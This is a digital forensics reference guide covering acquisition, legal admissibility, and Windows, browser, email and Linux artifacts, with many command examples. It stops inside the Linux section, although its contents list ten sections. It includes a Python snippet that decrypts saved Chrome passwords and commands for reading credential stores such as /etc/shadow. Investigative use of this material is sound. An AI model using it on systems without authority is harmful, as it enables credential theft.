# Digital Forensics Reference Library

> A comprehensive professional reference for digital forensics practitioners, incident responders, and cybersecurity analysts.

---

## Table of Contents

1. [Digital Forensics Fundamentals](#1-digital-forensics-fundamentals)
2. [Windows Forensics — Artifacts](#2-windows-forensics--artifacts)
3. [Windows Forensics — Advanced](#3-windows-forensics--advanced)
4. [Linux & macOS Forensics](#4-linux--macos-forensics)
5. [Memory Forensics](#5-memory-forensics)
6. [Disk & File System Forensics](#6-disk--file-system-forensics)
7. [Network Forensics](#7-network-forensics)
8. [Mobile Device Forensics](#8-mobile-device-forensics)
9. [Cloud & Email Forensics](#9-cloud--email-forensics)
10. [Forensic Reporting & Tools Reference](#10-forensic-reporting--tools-reference)

---

## 1. Digital Forensics Fundamentals

### Locard's Exchange Principle

Edmond Locard (1877–1966) formulated the foundational axiom of forensic science: **every contact leaves a trace**. In digital forensics this manifests as:

- Every user action modifies timestamps, log entries, memory, or registry keys
- Malware execution leaves artifacts in prefetch, Amcache, event logs, and network flows
- Investigator actions themselves alter evidence — hence the primacy of write protection and imaging before examination
- Even viewing a file changes the Last Accessed timestamp (though NTFS last-access updates are often disabled by default on modern Windows)

The principle drives every procedural decision: acquire before examine, image before analyze, verify before testify.

---

### Forensics Methodology

The SWGDE/NIST framework defines six ordered phases:

#### Phase 1 — Identification
- Define the scope: which devices, accounts, cloud services, and time ranges are in scope
- Assess the legal authority: search warrant, consent form, corporate policy, or exigent circumstances
- Document the scene: photographs, network diagrams, device inventory (make, model, serial, MAC/IP)
- Identify all potential evidence sources: endpoints, servers, mobile devices, cloud storage, backup media, IoT devices

#### Phase 2 — Preservation
- Apply write blockers before connecting media
- Photograph device state (powered on/off, screen content, running processes)
- Maintain chain of custody from first contact
- Power considerations: powered-on systems contain volatile evidence (RAM, active network connections) — decide live acquisition vs. immediate shutdown based on case needs
- Evidence bags, tamper-evident seals, anti-static packaging for storage media

#### Phase 3 — Collection
- Follow order of volatility (see below)
- Document collection methodology including tool versions and hash values
- Capture volatile data first: RAM, running processes, network connections, logged-on users
- Create forensic images of storage media with hash verification
- Collect system artifacts: event logs, prefetch files, registry hives

#### Phase 4 — Examination
- Parse collected data using forensic tools
- Identify relevant artifacts among the volume of data
- Recover deleted files and hidden data
- Decode encoded/compressed data
- Convert timestamps across timezones and formats

#### Phase 5 — Analysis
- Correlate artifacts across data sources to build a timeline
- Identify indicators of compromise (IOCs): malicious files, C2 domains, lateral movement
- Reconstruct attacker actions from evidence
- Apply investigative hypotheses and test against evidence
- Distinguish between user actions and automated/malware actions

#### Phase 6 — Presentation
- Document findings in a structured forensic report
- Create a forensic timeline (see Section 10)
- Prepare court-ready exhibits with proper attribution
- Present findings to legal counsel, management, or court in accessible language
- Preserve case file with all evidence, tool outputs, and notes for potential re-examination

---

### Legal Considerations

#### Chain of Custody
The chain of custody is a chronological record documenting every person who had access to evidence, and every action taken. Requirements:
- Written log signed by each custodian
- Date/time of each transfer
- Description of evidence including unique identifiers (hash values, serial numbers)
- Purpose of each transfer or examination
- Tamper-evident packaging with numbered seals
- Storage conditions (temperature, humidity, static protection) documented

A broken chain of custody may render evidence inadmissible or subject to challenge in court.

#### Admissibility Standards
**Federal Rules of Evidence (FRE) Rule 702** governs expert witness testimony in US federal courts. An expert may testify if:
1. The expert's scientific, technical, or specialized knowledge will help the trier of fact
2. The testimony is based on sufficient facts or data
3. The testimony is the product of reliable principles and methods
4. The expert has reliably applied the principles and methods to the facts of the case

**Daubert Standard** (Daubert v. Merrell Dow Pharmaceuticals, 1993) establishes criteria for scientific evidence admissibility:
- Whether the theory or technique can be (and has been) tested
- Whether it has been subjected to peer review and publication
- The known or potential error rate of the technique
- The existence and maintenance of standards controlling the technique's operation
- Whether the technique has been generally accepted in the relevant scientific community

**Best Evidence Rule (FRE 1002):** An original document is required to prove its content. Forensic images satisfy this requirement when properly authenticated with hash values.

**Fourth Amendment Considerations:** Warrantless searches require one of the recognized exceptions (consent, exigent circumstances, plain view, search incident to arrest). Always verify legal authority before acquisition.

---

### Order of Volatility (RFC 3227)

Evidence must be collected from most volatile (shortest-lived) to least volatile:

| Priority | Source | Volatility | Notes |
|----------|--------|-----------|-------|
| 1 | CPU registers, cache | Seconds | Lost immediately on power cycle |
| 2 | RAM / main memory | Minutes | Lost on shutdown; preserves processes, keys, credentials |
| 3 | Swap / paging file | Hours | pagefile.sys (Windows), swap partition (Linux) |
| 4 | Network state | Hours | Active connections, ARP cache, routing table |
| 5 | Running processes | Hours | Process list, open files, loaded modules |
| 6 | Disk storage | Days–Years | NTFS, ext4, APFS — survives power cycles |
| 7 | System logs | Days–Months | Event logs, syslog, auth.log — often rotate |
| 8 | Remote logging | Months | SIEM, cloud logs, CDN logs |
| 9 | Archive/backup | Years | Tape, S3 Glacier, backup appliances |

Commands for capturing volatile data on Windows:
```cmd
:: Capture network state
netstat -ano > netstat.txt
arp -a >> netstat.txt
ipconfig /all >> netstat.txt
route print >> netstat.txt

:: Capture process list
tasklist /v /fo csv > processes.csv
wmic process get Name,ProcessId,ParentProcessId,CommandLine,ExecutablePath /format:csv > wmic_proc.csv

:: Logged-on users
query user
net session
```

---

### Write Blockers

Write blockers prevent any writes to evidence media during acquisition, preserving forensic integrity.

#### Hardware Write Blockers

**Tableau T35es (Guidance Software)**
- Supports SATA, SAS, IDE, USB
- Hardware write-block for forensic imaging
- Pass-through speeds up to 14 GB/min
- LCD display shows drive information and status
- Used with FTK Imager, EnCase, dd

**WiebeTech Forensic UltraDock v5**
- USB 3.0, eSATA, FireWire 800/400 connectivity
- Write-protect switch with LED indicator
- Supports 2.5" and 3.5" SATA drives
- Bridge-based hardware write protection

**Logicube Falcon**
- Standalone forensic imager and write blocker
- Can image to multiple destinations simultaneously
- Built-in hash verification (MD5/SHA-1/SHA-256)

#### Software Write Blockers

**dc3dd** (DoD Cyber Crime Center fork of GNU dd):
```bash
# Image with hashing and logging
dc3dd if=/dev/sdb hash=sha256 hlog=hash.log log=acquisition.log of=evidence.dd
```

**dcfldd** (DoD fork with progress and hashing):
```bash
dcfldd if=/dev/sdb of=evidence.img hash=sha256 hashlog=sha256.txt statusinterval=100
```

**Linux kernel write-protect** via udev rule:
```bash
# /etc/udev/rules.d/80-write-protect.rules
ACTION=="add", KERNEL=="sd*", ATTR{removable}=="1", RUN+="/sbin/blockdev --setro /dev/%k"
```

---

### Forensic Imaging Tools

#### FTK Imager (AccessData/Exterro)
- GUI-based image acquisition for Windows
- Supports E01 (EnCase), AFF4, DD/RAW, AD1 formats
- Built-in hash verification and image verification
- Can mount images as read-only drive letters
- Preview evidence without full case creation
- Free download: https://www.exterro.com/ftk-imager

```
Usage: File > Create Disk Image > select source > select format > add MD5/SHA1 > start
```

#### dd (GNU coreutils)
```bash
# Basic dd imaging
dd if=/dev/sdb of=/mnt/evidence/disk.dd bs=512 conv=noerror,sync status=progress

# With hash verification
dd if=/dev/sdb bs=512 conv=noerror,sync | tee disk.dd | sha256sum > disk.sha256
```

#### Guymager
- Open-source GUI forensic imager for Linux (part of SIFT Workstation)
- Supports EWF (E01), AFF, DD formats
- Multi-threaded for fast acquisition
- Built-in MD5/SHA-1/SHA-256 verification

#### Hash Verification
```bash
# Verify image integrity
md5sum evidence.dd
sha1sum evidence.dd
sha256sum evidence.dd

# Compare source and image
md5sum /dev/sdb
md5sum evidence.dd
# Both must match

# Verify E01 image with ewfverify
ewfverify evidence.E01
```

---

### Forensic Lab Setup

**Physical Requirements:**
- Dedicated air-gapped network segment for malware analysis
- Anti-static flooring and workstations with ESD mats
- Faraday cage or RF-shielded room for mobile device acquisition
- Temperature and humidity-controlled evidence storage
- Locking evidence lockers with access logs

**Software Platform Options:**

| Platform | Type | Notes |
|----------|------|-------|
| EnCase (OpenText) | Commercial | Industry standard; E01 format; court-accepted |
| FTK (Exterro) | Commercial | Fast indexing; strong email analysis; PostgreSQL backend |
| Magnet AXIOM | Commercial | Excellent mobile + cloud + computer in one platform |
| Autopsy / Sleuth Kit | Open-source | Full-featured; extensible via plugins; SIFT-included |
| SIFT Workstation | Open-source | Ubuntu-based distro with 40+ forensic tools pre-installed |

**SIFT Workstation Installation:**
```bash
# Install via SANS DFIR script
curl -o sift.sh https://raw.githubusercontent.com/teamdfir/sift-saltstack/master/install/install.sh
sudo bash sift.sh
```

**Autopsy + Sleuth Kit:**
```bash
# Debian/Ubuntu
sudo apt install autopsy sleuthkit

# Launch Autopsy web interface
autopsy  # Opens at http://localhost:9999/autopsy
```

---
## 2. Windows Forensics — Artifacts

### Registry Hive Files

The Windows Registry is a hierarchical database storing system and user configuration. Forensically, registry hives persist evidence of program execution, user activity, network connections, and system configuration.

#### Hive Locations and Contents

| Hive File | Location | Contents |
|-----------|----------|---------|
| SYSTEM | `C:\\Windows\\System32\\config\\SYSTEM` | Hardware, services, timezone, USB devices, mounted volumes |
| SOFTWARE | `C:\\Windows\\System32\\config\\SOFTWARE` | Installed programs, OS version, run keys, shell extensions |
| SAM | `C:\\Windows\\System32\\config\\SAM` | Local user accounts and password hashes |
| SECURITY | `C:\\Windows\\System32\\config\\SECURITY` | LSA secrets, audit policy, cached domain credentials |
| NTUSER.DAT | `C:\\Users\\<username>\\NTUSER.DAT` | Per-user settings: recent docs, typed URLs, run keys |
| UsrClass.dat | `C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat` | Shellbags, file/folder open history |

#### Key Forensic Registry Keys

**UserAssist** — GUI program execution history with timestamps and run count:
```
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\
{CEBFF5CD-...}\Count  <- Applications
{F4E57C4B-...}\Count  <- Shortcut executions
```
Values are ROT-13 encoded. Use RegRipper or Eric Zimmerman's RECmd to decode.

**MuiCache** — Recently executed programs (persists even after deletion):
```
HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache
```

**RecentDocs** — Recently opened files by extension:
```
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.pdf
```

**ShimCache / AppCompatCache** — Application compatibility cache; records every executable run (path, last modified time, executed flag on Win8+):
```
HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache
```
Parse with: `AppCompatCacheParser.exe -f SYSTEM --csv output\`

**Amcache.hve** (`C:\\Windows\\AppCompat\\Programs\\Amcache.hve`) — Detailed program execution artifacts including SHA-1 hash, file path, install date, publisher:
```powershell
# Parse Amcache
AmcacheParser.exe -f Amcache.hve --csv output\
```

**BAM/DAM** (Background Activity Moderator / Desktop Activity Moderator):
```
HKLM\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings\<SID>
HKLM\SYSTEM\CurrentControlSet\Services\dam\State\UserSettings\<SID>
```
Records last execution time for each executable per user. Windows 10 1709+.

**USB Device History:**
```
HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR          <- Device class, serial number
HKLM\SYSTEM\CurrentControlSet\Enum\USB              <- VID/PID
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\EMDMgmt  <- Drive letters assigned
HKLM\SYSTEM\MountedDevices                          <- Volume GUIDs
```

**Run / RunOnce Keys** (persistence mechanisms):
```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

**Network History:**
```
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Signatures\Unmanaged
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles
```
Records network SSIDs, first/last connected dates, MAC addresses.

---

### Windows Event Log Analysis

Event logs are stored as `.evtx` files in `C:\\Windows\\System32\\winevt\\Logs\\`.

Parse with: `EvtxECmd.exe -d "C:\Windows\System32\winevt\Logs" --csv output\ --csvf all_events.csv`

#### Security Log (Security.evtx) — Key Event IDs

| Event ID | Description | Key Fields |
|----------|-------------|-----------|
| 4624 | Successful logon | LogonType, SubjectUserName, IpAddress, WorkstationName |
| 4625 | Failed logon | LogonType, SubjectUserName, FailureReason |
| 4627 | Group membership at logon | Token groups assigned |
| 4648 | Explicit credentials logon (runas) | TargetUserName, TargetServerName |
| 4656 | Object handle requested | ObjectName, AccessMask |
| 4663 | Object access attempt | ObjectName, ProcessName, AccessMask |
| 4672 | Special privileges assigned | SubjectUserName, PrivilegeList |
| 4688 | Process created | NewProcessName, CommandLine, ParentProcessName |
| 4689 | Process terminated | ProcessName |
| 4697 | Service installed | ServiceName, ServiceFileName |
| 4698 | Scheduled task created | TaskName, TaskContent |
| 4700/4701 | Scheduled task enabled/disabled | TaskName |
| 4702 | Scheduled task updated | TaskName, TaskNewContent |
| 4720 | User account created | TargetUserName |
| 4722 | User account enabled | TargetUserName |
| 4724 | Password reset attempt | TargetUserName |
| 4726 | User account deleted | TargetUserName |
| 4728/4732/4756 | Member added to security group | MemberName, GroupName |
| 4776 | NTLM credential validation | TargetUserName, Workstation |
| 7045 | Service installed (System log) | ServiceName, ImagePath |

**Logon Types:**
- Type 2: Interactive (local keyboard/mouse)
- Type 3: Network (SMB, mapped drives)
- Type 4: Batch (scheduled tasks)
- Type 5: Service logon
- Type 7: Unlock workstation
- Type 8: NetworkCleartext (IIS basic auth, PowerShell remoting)
- Type 9: NewCredentials (runas /netonly)
- Type 10: RemoteInteractive (RDP)
- Type 11: CachedInteractive (offline domain logon)

#### PowerShell Logging Events
```
Microsoft-Windows-PowerShell/Operational.evtx
Event 4103: Module logging (cmdlet/function calls)
Event 4104: Script block logging (full script content, even obfuscated)
Event 400/600: PowerShell engine start/stop
```

Enable script block logging via GPO:
`Computer Configuration > Administrative Templates > Windows Components > Windows PowerShell > Turn on PowerShell Script Block Logging`

---

### Prefetch Files

Windows Prefetch records program execution to speed subsequent launches. Located at `C:\\Windows\\Prefetch\\` (`.pf` extension).

**What prefetch captures:**
- Executable name and path
- Run count (number of executions)
- Last run time (up to 8 timestamps on Win8+)
- Files and directories accessed during execution (evidence of file access)
- Volume information

**Parsing with PECmd.exe (Eric Zimmerman):**
```cmd
PECmd.exe -d "C:\Windows\Prefetch" --csv output\ -q
PECmd.exe -f "C:\Windows\Prefetch\MALWARE.EXE-AB12CD34.pf" --json output\
```

**Key forensic value:** Even if a malicious executable was deleted, its prefetch file may remain, proving it was executed. The accessed file list reveals what the malware touched.

Prefetch is enabled by default on workstations; often disabled on servers. Check:
```
HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters
EnablePrefetcher = 3 (enabled)
```

---

### LNK Files and Jump Lists

#### LNK (Shortcut) Files
Located in `C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\`
Each `.lnk` file records: target path, file size, MAC timestamps of target at time of access, volume serial number, machine NetBIOS name.

```cmd
LECmd.exe -d "C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Recent" --csv output\
```

#### Jump Lists
Reveal recently and frequently accessed files per application. Two types:
- **AutomaticDestinations** (`*.automaticDestinations-ms`): auto-populated by OS
- **CustomDestinations** (`*.customDestinations-ms`): app-defined pinned items

Location: `C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\AutomaticDestinations\\`

```cmd
JLECmd.exe -d "C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Recent" --csv output\
```
Jump lists can reveal files accessed from USB or network locations even after those files were deleted.

---

### Shellbags

Shellbags store user Explorer window preferences (folder view settings) but forensically reveal **folder browsing history** — even for deleted folders, network shares, and removable media.

Located in `UsrClass.dat`:
```
HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\Bags
HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU
```

```cmd
SBECmd.exe -d "C:\Users\<user>\AppData\Local\Microsoft\Windows" --csv output\
```

---

### Windows Timeline

Windows Timeline (Activity History, enabled from Windows 10 1803) stores app usage, file opens, and clipboard content in an SQLite database.

Location: `C:\\Users\\<user>\\AppData\\Local\\ConnectedDevicesPlatform\\<GUID>\\ActivitiesCache.db`

Key tables: `Activity`, `Activity_PackageId`, `ActivityOperation`

```bash
# Query with sqlite3
sqlite3 ActivitiesCache.db "SELECT StartTime, EndTime, AppActivityId, ClipboardPayload FROM Activity;"
```

WxTCmd.exe parses this artifact into CSV for timeline analysis.

---

### Recycle Bin

Deleted files moved to `C:\\$Recycle.Bin\\<SID>\\`. Each deletion creates two files:
- `$I<random>.<ext>` — Metadata: original path, file size, deletion timestamp
- `$R<random>.<ext>` — Actual file content

```cmd
# Parse $I files with RBCmd (Eric Zimmerman)
RBCmd.exe -d "C:\$Recycle.Bin" --csv output\
```

---

### Volume Shadow Copies

VSS snapshots allow recovery of previous file versions. Critical for recovering deleted/modified evidence and malware that tried to cover tracks.

```cmd
:: List shadow copies
vssadmin list shadows

:: Mount shadow copy (requires symlink)
mklink /d C:\VSS \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\

:: List files in shadow copy
dir C:\VSS\Windows\System32\winevt\Logs\

:: Copy files from shadow copy
robocopy C:\VSS\Users\Administrator\Documents C:\Recovery\
```

---

### $MFT and $UsnJrnl

**$MFT (Master File Table):** Every NTFS file/directory has an MFT entry. Contains: timestamps (Created, Modified, MFT Modified, Accessed), file size, parent directory reference, attribute list including $DATA (content) and $FILE_NAME.

**$UsnJrnl (Update Sequence Number Journal):** Change journal recording every file create, modify, delete, rename operation on the volume. Located at `C:\\$Extend\\$UsnJrnl:$J`.

```cmd
MFTECmd.exe -f "C:\$MFT" --csv output\ --csvf mft.csv
MFTECmd.exe -f "C:\$Extend\$UsnJrnl:$J" --csv output\ --csvf usnjrnl.csv
```

Forensic value: $UsnJrnl can reveal files that were created and deleted within the journal's retention window, proving a file existed even after deletion.

---
## 3. Windows Forensics — Advanced

### Browser Artifacts

Browser history is often the most direct evidence of user intent, research, and communications.

#### Google Chrome / Chromium
Profile location: `C:\\Users\\<user>\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\`

| Database File | Contents |
|---------------|---------|
| `History` | URLs visited, visit count, titles, typed URLs |
| `Cache/` | Cached web content (use ChromeCacheView) |
| `Cookies` | Cookie name, value, domain, creation/expiry |
| `Login Data` | Saved usernames and encrypted passwords |
| `Web Data` | Autofill form data, credit cards |
| `Favicons` | Favicons with associated URLs (even after history cleared) |
| `Shortcuts` | Omnibox shortcuts typed |
| `Network Action Predictor` | Pre-fetched URLs |
| `Extension Cookies` | Cookies for Chrome extensions |

```bash
# Query Chrome history with sqlite3
sqlite3 History "SELECT datetime(last_visit_time/1000000-11644473600,'unixepoch','localtime'), url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 50;"
```

Note: Chrome timestamps use Windows FILETIME format — microseconds since Jan 1, 1601.

**Chrome Password Decryption:**
Passwords are encrypted with DPAPI (user context). Decrypt offline with DPAPI master key and user password, or on a live system:
```python
import win32crypt, sqlite3
# Requires running as the target user
conn = sqlite3.connect("Login Data")
for row in conn.execute("SELECT origin_url, username_value, password_value FROM logins"):
    pw = win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1]
```

#### Mozilla Firefox
Profile location: `C:\\Users\\<user>\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\<profile>\\`

| File | Contents |
|------|---------|
| `places.sqlite` | History (moz_places), bookmarks (moz_bookmarks), downloads |
| `cookies.sqlite` | Cookie data (moz_cookies table) |
| `formhistory.sqlite` | Form autofill entries |
| `logins.json` + `key4.db` | Saved passwords (encrypted with master password) |
| `sessionstore.jsonlz4` | Current/restored session tabs |

```bash
sqlite3 places.sqlite "SELECT datetime(last_visit_date/1000000,'unixepoch','localtime'), url, title, visit_count FROM moz_places WHERE last_visit_date IS NOT NULL ORDER BY last_visit_date DESC LIMIT 50;"
```

#### Microsoft Edge (Chromium-based)
Profile location: `C:\\Users\\<user>\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\`
Same SQLite structure as Chrome. Additional Edge-specific artifacts:
- `Collections` database for Edge Collections feature
- `Favorites` for bookmarks

---

### Email Artifacts

#### Microsoft Outlook — PST/OST Files
- **PST (Personal Storage Table):** Local mail archive, stored anywhere the user configured
- **OST (Offline Storage Table):** Local cache of Exchange/M365 mailbox, at `C:\\Users\\<user>\\AppData\\Local\\Microsoft\\Outlook\\`

**Parsing with libpff / pffexport:**
```bash
# Install
sudo apt install libpff-dev pff-tools

# Export PST to readable format
pffexport -t all suspect.pst
# Creates directory with email/.msg files, attachments, calendar items
```

**Key items to examine:**
- Deleted Items folder (deleted emails)
- Recoverable Items / Purges folder (double-deleted)
- Rules (malicious auto-forward rules)
- Drafts (evidence of composed but unsent messages)
- Calendar entries (meeting times, locations)
- Contacts exported to/from external services

**EnCase / FTK** can parse PST/OST natively and search across email content.

#### Mozilla Thunderbird — MBOX
Profile location: `C:\\Users\\<user>\\AppData\\Roaming\\Thunderbird\\Profiles\\<profile>\\Mail\\`
Each folder is a plain MBOX file (text format — one email per record separated by `From ` lines).

```bash
# Convert MBOX to EML files
python3 -c "
import mailbox, os
mbox = mailbox.mbox('Inbox')
os.makedirs('eml_out', exist_ok=True)
for i, msg in enumerate(mbox):
    with open(f'eml_out/{i}.eml', 'w') as f:
        f.write(str(msg))
"
```

---

### Windows Search Index

Windows Desktop Search stores a full-text index of file contents, metadata, and email at:
`C:\\ProgramData\\Microsoft\\Search\\Data\\Applications\\Windows\\Windows.edb`

This JET/ESE database can reveal:
- Filenames and paths indexed (including deleted files if index not updated)
- Document metadata (author, creation date, last saved)
- Email content from Outlook
- Content of Office documents, PDFs, text files

**Parse with ESEDatabaseView** or:
```bash
# On Linux with libesedb
esedbexport Windows.edb
```

---

### SRUM Database

**SRUM (System Resource Usage Monitor)** records detailed system activity at `C:\\Windows\\System32\\sru\\SRUDB.dat` (ESE database).

Tables of forensic interest:

| Table | Contents |
|-------|---------|
| `{973F5D5C-...}` Network Usage | BytesSent, BytesReceived per app per hour |
| `{D10CA2FE-...}` Application Resource Usage | CPU time, disk reads/writes per app |
| `{FEE4E14F-...}` Energy Estimator | Battery drain per app |
| `{DD6636C4-...}` Network Connections | Interface, profile, connected/disconnected times |

**Parse with SrumECmd.exe:**
```cmd
SrumECmd.exe -f "C:\Windows\System32\sru\SRUDB.dat" -r "C:\Windows\System32\config\SOFTWARE" --csv output\
```

Forensic value: SRUM proves an application ran and quantifies its network activity — even if the executable was deleted. Critical for proving data exfiltration volumes.

---

### WMI Persistence Artifacts

Attackers use WMI event subscriptions for fileless persistence. WMI repository:
`C:\\Windows\\System32\\wbem\\Repository\\`

Three components of a WMI subscription:
1. **EventFilter** — The trigger condition (e.g., every 60 seconds)
2. **EventConsumer** — The action (ActiveScriptEventConsumer runs VBScript/PowerShell; CommandLineEventConsumer runs a process)
3. **FilterToConsumerBinding** — Links filter to consumer

**Parse WMI subscriptions:**
```powershell
# Live system enumeration
Get-WMIObject -Namespace root\subscription -Class __EventFilter
Get-WMIObject -Namespace root\subscription -Class __EventConsumer
Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding
```

**Offline analysis with PyWMIPersistenceFinder:**
```bash
python3 PyWMIPersistenceFinder.py --help
```

---

### Scheduled Tasks

Scheduled tasks XML files: `C:\\Windows\\System32\\Tasks\\` (and subdirectories)
Registry: `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks`

```powershell
# List all tasks with their run commands
Get-ScheduledTask | Select-Object TaskName, TaskPath, State, @{N='Command';E={$_.Actions.Execute}}, @{N='Args';E={$_.Actions.Arguments}} | Format-Table -AutoSize

# Export all task XML for offline review
schtasks /query /fo XML /v > all_tasks.xml
```

Event logs for task execution:
`Microsoft-Windows-TaskScheduler/Operational.evtx`
- Event 106: Task registered
- Event 200/201: Task action started/completed
- Event 140: Task updated
- Event 141: Task deleted

---

### PowerShell History

**PSReadLine history** (persistent across sessions):
```
C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

**Script block logging** (requires GPO enablement) — Event ID 4104 in:
`Microsoft-Windows-PowerShell/Operational.evtx`

**Transcripts:** If transcript logging is enabled:
```powershell
Start-Transcript -Path "C:\Logs\transcript.txt"
```

**WMI-based PowerShell execution** may not appear in PSReadLine but will appear in script block logs.

**AMSI (Antimalware Scan Interface):** AMSI logs in Application event log can reveal decoded malicious PowerShell even when obfuscated.

---

### Windows Error Reporting (WER)

WER files at `C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportArchive\\` and `C:\\Users\\<user>\\AppData\\Local\\Microsoft\\Windows\\WER\\`

Contents:
- `Report.wer`: crash details including faulting module, exception code, app version
- `*.mdmp`: Mini memory dump of crashed process (can extract strings, injected code)
- Metadata: crash timestamp, OS version, machine name

Forensic value: Malware crashes leave WER artifacts proving execution even after deletion. Memory dumps may contain injected shellcode or C2 configuration.

---

### Thumbnail Cache

Windows caches thumbnails of images/videos/documents viewed in Explorer:
`C:\\Users\\<user>\\AppData\\Local\\Microsoft\\Windows\\Explorer\\thumbcache_*.db`

Multiple resolution caches: thumbcache_32.db, thumbcache_96.db, thumbcache_256.db, thumbcache_1024.db, thumbcache_sr.db

**Parse with Thumbcache Viewer** or:
```cmd
ThumbCache_Viewer.exe
```

Forensic value: Thumbnail caches prove a user viewed images/videos even after those files were deleted. Critical for CSAM investigations and proving awareness of file content.

---

### Cortana / Windows Search Artifacts

`C:\\Users\\<user>\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_*/LocalState\\`
`C:\\Users\\<user>\\AppData\\Local\\Microsoft\\Windows\\ConnectedSearch\\`

Contains SQLite databases with:
- Search queries typed into Windows Search
- Web searches via Cortana
- Reminds / calendar actions

---
## 4. Linux & macOS Forensics

### Linux Artifacts

#### Authentication and System Logs

| Log File | Contents |
|----------|---------|
| `/var/log/auth.log` | SSH logins, sudo usage, PAM authentication (Debian/Ubuntu) |
| `/var/log/secure` | Same as auth.log on RHEL/CentOS |
| `/var/log/syslog` | General system events (Debian/Ubuntu) |
| `/var/log/messages` | General system events (RHEL/CentOS) |
| `/var/log/kern.log` | Kernel messages |
| `/var/log/apache2/` | Web server access and error logs |
| `/var/log/nginx/` | Nginx access and error logs |
| `/var/log/mysql/` | Database query and error logs |
| `/var/log/cron` | Cron job execution |
| `/var/log/wtmp` | Binary: all logins/logouts (read with `last`) |
| `/var/log/btmp` | Binary: failed logins (read with `lastb`) |
| `/var/log/lastlog` | Binary: last login per user (read with `lastlog`) |
| `/var/log/utmp` | Binary: currently logged-in users (read with `who`) |

```bash
# Parse binary login files
utmpdump /var/log/wtmp
utmpdump /var/log/btmp
last -f /var/log/wtmp -F  # Full timestamps
lastb -f /var/log/btmp    # Failed logins

# SSH specific
grep "Accepted\|Failed\|Invalid" /var/log/auth.log
grep "sudo" /var/log/auth.log | grep -v "session"

# Kernel ring buffer (recent messages)
dmesg -T --level=err,warn
journalctl -k -p err..emerg
```

#### Shell History Files

| Shell | History File |
|-------|-------------|
| bash | `~/.bash_history` (also `/root/.bash_history`) |
| zsh | `~/.zsh_history` (extended format with timestamps if EXTENDED_HISTORY set) |
| fish | `~/.local/share/fish/fish_history` |
| sh | Varies by implementation |

**Timestamp preservation in zsh_history:**
```
: 1699000000:0;sudo apt install malware
```
Format: `: <unix_epoch>:<elapsed_seconds>;<command>`

**Detect cleared history:**
```bash
# Check if history file was recently truncated (small size, recent mtime)
ls -la ~/.bash_history
stat ~/.bash_history

# HISTSIZE and HISTFILESIZE set to 0 to disable -- check profile files
grep -r "HISTSIZE\|HISTFILESIZE\|HISTFILE" /etc/profile /etc/profile.d/ ~/.bashrc ~/.bash_profile
```

#### User Account Files
```bash
# /etc/passwd -- all accounts (no passwords in modern Linux)
# Format: username:x:UID:GID:comment:home:shell
awk -F: '$3 >= 1000 {print}' /etc/passwd  # Human user accounts

# /etc/shadow -- hashed passwords (root only)
# Format: username:$type$salt$hash:last_changed:min:max:warn:inactive:expire
# Hash types: $1=MD5, $5=SHA-256, $6=SHA-512, $y=yescrypt

# /etc/group -- group memberships
# Check for unauthorized sudo group members
grep sudo /etc/group
```

#### Cron Jobs and Persistence
```bash
# System crontabs
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/

# User crontabs (stored in /var/spool/cron/crontabs/)
crontab -l -u <username>
ls -la /var/spool/cron/crontabs/

# At jobs
ls -la /var/spool/at/

# Systemd timers (modern alternative to cron)
systemctl list-timers --all
```

#### /proc Filesystem Forensics
The `/proc` virtual filesystem exposes kernel and process state in real-time:

```bash
# Process information
cat /proc/<PID>/cmdline | tr '\0' ' '    # Full command line
cat /proc/<PID>/environ | tr '\0' '\n'   # Environment variables
ls -la /proc/<PID>/fd/                   # Open file descriptors
cat /proc/<PID>/maps                     # Memory mappings
cat /proc/<PID>/net/tcp                  # TCP connections (hex)

# System-wide
cat /proc/net/arp                        # ARP cache
cat /proc/net/tcp                        # All TCP connections
cat /proc/sys/kernel/hostname
cat /proc/version                        # Kernel version
```

#### Systemd Journal
```bash
# View all logs
journalctl -xe

# Filter by time
journalctl --since "2024-01-01" --until "2024-01-31"

# Filter by unit (service)
journalctl -u sshd.service -u apache2.service

# Boot-specific logs
journalctl -b -1  # Previous boot
journalctl --list-boots

# Priority filtering
journalctl -p err..crit  # Error and above

# JSON output for parsing
journalctl -o json | python3 -m json.tool | head -100

# Export journal for offline analysis
journalctl --directory=/mnt/evidence/var/log/journal -o export > journal_export.bin
```

#### Auditd Logs
```bash
# Audit log location
cat /var/log/audit/audit.log

